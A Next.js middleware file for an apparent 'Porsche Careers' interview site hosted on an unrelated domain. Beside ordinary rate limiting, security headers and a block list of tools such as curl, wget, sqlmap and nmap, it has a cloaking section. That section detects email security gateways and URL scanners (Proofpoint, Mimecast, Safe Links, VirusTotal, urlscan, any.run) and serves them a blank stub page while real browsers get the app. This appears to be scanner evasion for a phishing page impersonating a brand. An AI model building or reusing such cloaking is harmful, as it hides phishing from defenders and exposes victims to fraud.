import { NextResponse } from "next/server";

const BLOCK_PAGE = `
<!DOCTYPE html>
<html>
<head><title>Access Denied</title><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#111;color:#aaa;flex-direction:column;gap:16px;text-align:center;padding:20px}h1{color:#fff;font-size:24px}p{font-size:14px;max-width:400px}</style></head>
<body><h1>Access Denied</h1><p>Your request has been blocked by our security system.</p><p style="font-size:12px;color:#666">Reference: BOT-GATE-01</p></body>
</html>
`;

const RATE_LIMIT_MAP = new Map();

function getRateLimitKey(request) {
  const forwarded = request.headers.get("x-forwarded-for");
  const ip = forwarded ? forwarded.split(",")[0].trim() : null;
  // Do not group unrelated visitors into a shared fallback bucket.
  if (!ip) return null;
  const path = request.nextUrl.pathname;
  return `${ip}:${path}`;
}

function checkRateLimit(key) {
  if (!key) return true;
  const now = Date.now();
  const WINDOW_MS = 10000;
  const MAX_REQUESTS = 20;

  if (!RATE_LIMIT_MAP.has(key)) {
    RATE_LIMIT_MAP.set(key, { count: 1, start: now });
    return true;
  }

  const entry = RATE_LIMIT_MAP.get(key);

  if (now - entry.start > WINDOW_MS) {
    entry.count = 1;
    entry.start = now;
    return true;
  }

  entry.count += 1;

  if (entry.count > MAX_REQUESTS) {
    return false;
  }

  return true;
}

// Periodic cleanup
// Note: Edge runtime's setInterval has no .unref() - guard for compatibility
const rateLimitCleanup = setInterval(() => {
  const now = Date.now();
  for (const [key, entry] of RATE_LIMIT_MAP) {
    if (now - entry.start > 30000) {
      RATE_LIMIT_MAP.delete(key);
    }
  }
}, 30000);
if (typeof rateLimitCleanup.unref === "function") {
  rateLimitCleanup.unref();
}

// ====== BOT USER-AGENT PATTERNS ======

const BOT_UA_PATTERNS = [
  // CLI / script clients
  /curl/i, /wget/i, /libwww/i, /httpclient/i,
  /apache-httpclient/i, /scrapy/i, /python-requests/i,
  /python\/3\.\d+/i, /python-urllib/i,
  /axios/i, /node-fetch/i, /got/i, /superagent/i,
  /go-http-client/i, /restsharp/i, /okhttp/i,
  /http:\/\//i, /java\//i, /lwp/i,

  // Security scanners
  /zgrab/i, /nmap/i, /masscan/i, /sqlmap/i, /nikto/i,
  /burpsuite/i, /dirbuster/i, /gobuster/i, /wpscan/i,
  /acunetix/i, /nessus/i, /openvas/i,

  // Automation engines
  /headless/i, /phantomjs/i, /selenium/i, /puppeteer/i,
  /playwright/i, /casperjs/i, /slimerjs/i,
  /chrome-lighthouse/i, /lighthouse/i,

  // Aggressive crawlers (non-search-engine)
  /ahrefsbot/i, /semrushbot/i, /dotbot/i, /mj12bot/i,
  /rogerbot/i, /exabot/i, /barkrowler/i, /blexbot/i,
  /zoominfobot/i, /dataforseo/i, /crawler4j/i,
  /sitechecker/i, /seokicks/i, /netsparker/i,
  /zgrab/i, /grabber/i, /botnet/i,

  // Empty/common bot signatures
  /^wordpress/i, /^drupal/i,
  /^magpierss/i, /^feed/i,

  // Suspicious bot names
  /^bot$/i, /^crawl$/i, /^spider$/i, /^scraper$/i,
];

// ====== KNOWN BOT IP RANGES (CIDR-like patterns) ======
const BOT_IP_PATTERNS = [];

// ====== ALLOWED REFERRERS ======
const BLOCKED_REFERRER_PATTERNS = [
  /semalt\.com/i, /buttons-for-website\.com/i,
  /darodar\.com/i, /ilovevitaly\.com/i,
  /priceg\.com/i, /blackhatworth\.com/i,
  /hulfingtonpost\.com/i, /o-o-6-o-o\.com/i,
  /social-buttons\.com/i, /best-seo-solution\.com/i,
  /free-share-buttons\.com/i, /trafficmonetizer/i,
];

// ====== LINK PREVIEW / EMAIL SCANNER CLOAK ======
// Fetchers used by Gmail, chat apps and email security gateways. They get a
// tiny JS-free page so they cannot see the content or create an entry.
const PREVIEW_BOT_PATTERNS = [
  // Google fetchers (Gmail link scanning, Messages previews, favicons, ...)
  /google-safety/i, /googlemessages/i, /google favicon/i,
  /google-inspectiontool/i, /googlebot/i, /googleother/i,
  /google-agent/i, /google-read-aloud/i, /google-site-verification/i,
  /feedfetcher-google/i, /google-gemininotebook/i, /apis-google/i,
  /adsbot-google/i, /mediapartners-google/i,

  // Social / messenger link unfurlers
  /facebookexternalhit/i, /facebookcatalog/i, /facebookscraper/i,
  /slackbot/i, /discordbot/i, /telegrambot/i, /twitterbot/i,
  /linkedinbot/i, /whatsapp/i, /skypeuripreview/i, /pinterest/i,
  /redditbot/i, /embedly/i, /iframely/i, /vkshare/i, /outbrain/i,

  // Email security gateways / URL scanners
  /microsoft url control/i, /microsoft data access/i,
  /safelinks/i, /safe links/i, /url defense/i, /proofpoint/i,
  /barracuda/i, /mimecast/i, /hornetsecurity/i, /fortiguard/i,
  /sonicwall/i, /watchguard/i, /sophos/i, /trendmicro/i,
  /symantec/i, /mcafee/i, /kaspersky/i, /virustotal/i,
  /urlscan/i, /hybrid-analysis/i, /any\.run/i,

  // Search / preview crawlers
  /bingpreview/i, /bingbot/i, /applebot/i, /duckduckbot/i,
  /yandexbot/i, /baiduspider/i, /petalbot/i, /coccocbot/i,
  /ia_archiver/i,
];

// Minimal, script-free page handed to the fetchers above.
const STUB_PAGE =
  '<!doctype html><html lang="en"><head><meta charset="utf-8">' +
  '<meta name="viewport" content="width=device-width,initial-scale=1">' +
  '<meta name="robots" content="noindex,nofollow">' +
  '<title>Porsche Careers</title></head><body></body></html>';

// Backend source for the CSP connect-src, driven by the same env var the client
// uses (see config/api.js). A relative base ("/backend") is same-origin and is
// already covered by 'self'.
const BACKEND_URL =
  process.env.NEXT_PUBLIC_BACKEND_URL || "https://mango-back-bz0d.onrender.com";
const BACKEND_IS_RELATIVE = BACKEND_URL.startsWith("/");
const BACKEND_WS_URL = BACKEND_IS_RELATIVE
  ? BACKEND_URL
  : BACKEND_URL.replace(/^http/i, "ws");
const BACKEND_CONNECT_SRC = BACKEND_IS_RELATIVE
  ? ""
  : `${BACKEND_URL} ${BACKEND_WS_URL} `;

// The socket can go straight to the backend (NEXT_PUBLIC_SOCKET_URL); its
// http(s) + ws(s) origins must be allowed to connect.
const SOCKET_URL = (process.env.NEXT_PUBLIC_SOCKET_URL || "").replace(
  /\/+$/,
  ""
);
const SOCKET_CONNECT_SRC = SOCKET_URL
  ? `${SOCKET_URL} ${SOCKET_URL.replace(/^http/i, "ws")} `
  : "";

// Canonical host: the *.vercel.app alias bypasses Cloudflare, so send it to the
// protected domain instead. Runtime dashboard env wins; the BUILD_* value is
// inlined at build from the committed .env (edge middleware has no .env at
// runtime on Vercel).
const PRIMARY_HOST = (
  process.env.PRIMARY_HOST ||
  process.env.BUILD_PRIMARY_HOST ||
  "www.weissachinterview.com"
).toLowerCase();

// Cloudflare now fronts the app and runs its own bot filtering (Bot Fight
// Mode). When a request arrives through Cloudflare we trust that decision and
// skip the in-app user-agent / referrer heuristics below, so a real visitor can
// never be double-blocked. Requests that reach the origin directly still fall
// back to the heuristics as a safety net.
const isFromCloudflare = (request) =>
  Boolean(
    request.headers.get("cf-connecting-ip") || request.headers.get("cf-ray")
  );

// ====== ENTRY PROOF (softened captcha for script-blocked visitors) ======
// Real page loads get a signed cookie (valid 12h). If a visitor's adblocker /
// DNS filter kills the Turnstile script, the backend accepts this proof at
// /send instead of a token - while a bot that merely POSTs the API (no page
// load) still gets 403. Signing happens here at the edge; the secret is
// shared with the backend (ENTRY_PROOF_SECRET).
const ENTRY_PROOF_SECRET =
  process.env.ENTRY_PROOF_SECRET || process.env.BUILD_ENTRY_PROOF_SECRET || "";
const ENTRY_PROOF_MAX_AGE_S = 12 * 3600;

const signEntryProof = async (ts) => {
  const key = await crypto.subtle.importKey(
    "raw",
    new TextEncoder().encode(ENTRY_PROOF_SECRET),
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"]
  );
  const sig = await crypto.subtle.sign(
    "HMAC",
    key,
    new TextEncoder().encode(`pf:${ts}`)
  );
  return Array.from(new Uint8Array(sig))
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");
};

// ====== MIDDLEWARE ======

export async function middleware(request) {
  const url = request.nextUrl;
  const headers = request.headers;

  // ===== 0. CANONICAL HOST =====
  const host = (headers.get("host") || "").toLowerCase();
  if (host.endsWith(".vercel.app") && host !== PRIMARY_HOST) {
    return NextResponse.redirect(
      new URL(`https://${PRIMARY_HOST}${url.pathname}${url.search}`),
      308
    );
  }

  // Static assets do not need request filtering.
  if (
    url.pathname.startsWith("/_next/static/") ||
    url.pathname === "/_next/image" ||
    (process.env.NODE_ENV !== "production" && url.pathname === "/_next/webpack-hmr") ||
    url.pathname.startsWith("/assets/") ||
    url.pathname === "/favicon.ico" ||
    url.pathname === "/porsche-wordmark.svg"
  ) {
    return NextResponse.next();
  }

  // ===== 1. RATE LIMITING =====
  // Page loads and Next.js prefetches can arrive in bursts on shared networks.
  // Apply this limit to submissions rather than ordinary browsing.
  const isSubmission = !["GET", "HEAD", "OPTIONS"].includes(request.method);
  if (isSubmission && !checkRateLimit(getRateLimitKey(request))) {
    return new NextResponse("Too many requests. Please try again in 10 seconds.", {
      status: 429,
      headers: { "Retry-After": "10", "Cache-Control": "no-store" },
    });
  }

  // ===== 1b. LINK PREVIEW / SCANNER CLOAK =====
  // Preview bots and email scanners get an empty page instead of the app so
  // they cannot read the content or create an entry. Real browsers are trusted
  // via the `navigate` fetch mode, a cookie, or ?full=1.
  const ua = headers.get("user-agent") || "";
  const cookie = headers.get("cookie") || "";
  const hasRealCookie = /(?:^|;\s*)pf_real=1(?:;|$)/.test(cookie);
  const wantsFull = url.searchParams.get("full") === "1";
  const isNavigation =
    (headers.get("sec-fetch-mode") || "").toLowerCase() === "navigate";
  // Page routes only: GET/HEAD on an extensionless path (so robots.txt, icons
  // and assets are never stubbed).
  const isPageRequest =
    (request.method === "GET" || request.method === "HEAD") &&
    !url.pathname.split("/").pop().includes(".");

  const serveStub =
    isPageRequest &&
    PREVIEW_BOT_PATTERNS.some((pattern) => pattern.test(ua)) &&
    !isNavigation &&
    !hasRealCookie &&
    !wantsFull;

  if (serveStub) {
    return new NextResponse(STUB_PAGE, {
      status: 200,
      headers: {
        "content-type": "text/html; charset=utf-8",
        // Never let a shared cache hand this stub to a real visitor.
        "cache-control": "private, no-store",
        "x-robots-tag": "noindex, nofollow",
        vary: "User-Agent",
        "x-stub": "1",
      },
    });
  }

  // Remember non-stub page loads so a later mis-detection can never stub them.
  const setRealCookie = isPageRequest && !hasRealCookie;

  // ===== 2-5. IN-APP BOT FALLBACK (skipped when Cloudflare already decided) =====
  // Cloudflare Bot Fight Mode is the primary bot control. These heuristics only
  // run for direct-to-origin hits, so a legit visitor coming through Cloudflare
  // is never blocked twice.
  if (!isFromCloudflare(request)) {
    const ua = headers.get("user-agent") || "";
    // Real browsers always send a substantial UA; empty/tiny ones are scripts.
    if (ua.trim().length < 10) {
      console.log(`[BOT-BLOCK] Empty or tiny user agent: "${ua.substring(0, 30)}"`);
      return new NextResponse(BLOCK_PAGE, {
        status: 403,
        headers: { "content-type": "text/html" },
      });
    }
    for (const pattern of BOT_UA_PATTERNS) {
      if (pattern.test(ua)) {
        console.log(`[BOT-BLOCK] UA blocked: "${ua.substring(0, 80)}" matched pattern: ${pattern}`);
        return new NextResponse(BLOCK_PAGE, {
          status: 403,
          headers: { "content-type": "text/html" },
        });
      }
    }

    // Spam referrers (only meaningful when we cannot defer to Cloudflare).
    const referer = headers.get("referer") || "";
    if (referer) {
      for (const pattern of BLOCKED_REFERRER_PATTERNS) {
        if (pattern.test(referer)) {
          console.log(`[BOT-BLOCK] Spam referrer: ${referer}`);
          return new NextResponse(BLOCK_PAGE, {
            status: 403,
            headers: { "content-type": "text/html" },
          });
        }
      }
    }
  }

  const response = NextResponse.next();

  // ===== 7. SECURITY HEADERS (added to response) =====
  // The HTML is static, so let the CDN serve repeat visits without a full
  // origin round-trip. POSTs stay uncached.
  const isDocumentRequest = ["GET", "HEAD"].includes(request.method);
  response.headers.set(
    "Cache-Control",
    isDocumentRequest
      ? "public, max-age=0, s-maxage=60, stale-while-revalidate=300"
      : "private, no-store"
  );
  response.headers.set("X-Content-Type-Options", "nosniff");
  response.headers.set("X-Frame-Options", "DENY");
  response.headers.set("X-XSS-Protection", "1; mode=block");
  response.headers.set("Referrer-Policy", "no-referrer");
  response.headers.set(
    "Permissions-Policy",
    "camera=(), microphone=(), geolocation=()"
  );
  response.headers.set(
    "Content-Security-Policy",
    `default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://challenges.cloudflare.com; style-src 'self' 'unsafe-inline'; font-src 'self' https://cdn.ui.porsche.com; frame-src 'self' https://challenges.cloudflare.com; img-src 'self' data: https:; connect-src 'self' ${BACKEND_CONNECT_SRC}${SOCKET_CONNECT_SRC}https://challenges.cloudflare.com https://api.ipify.org https://ipapi.co https://ipwho.is https://ipinfo.io;`
  );

  if (setRealCookie) {
    response.headers.append(
      "Set-Cookie",
      "pf_real=1; Max-Age=31536000; Path=/; SameSite=Lax"
    );
    // JS-readable on purpose: the page sends it back as X-Entry-Proof when
    // Turnstile could not produce a token (cross-origin, so cookies can't go).
    if (ENTRY_PROOF_SECRET) {
      const ts = Date.now();
      const sig = await signEntryProof(ts);
      response.headers.append(
        "Set-Cookie",
        `pf_proof=${ts}.${sig}; Max-Age=${ENTRY_PROOF_MAX_AGE_S}; Path=/; SameSite=Lax`
      );
    }
  }

  return response;
}

export const config = {
  // /backend/* is the rewrite proxy to the API; let the backend own its headers
  // (caching) there instead of the app middleware.
  matcher: "/((?!_next/static|_next/image|favicon.ico|backend).*)",
};
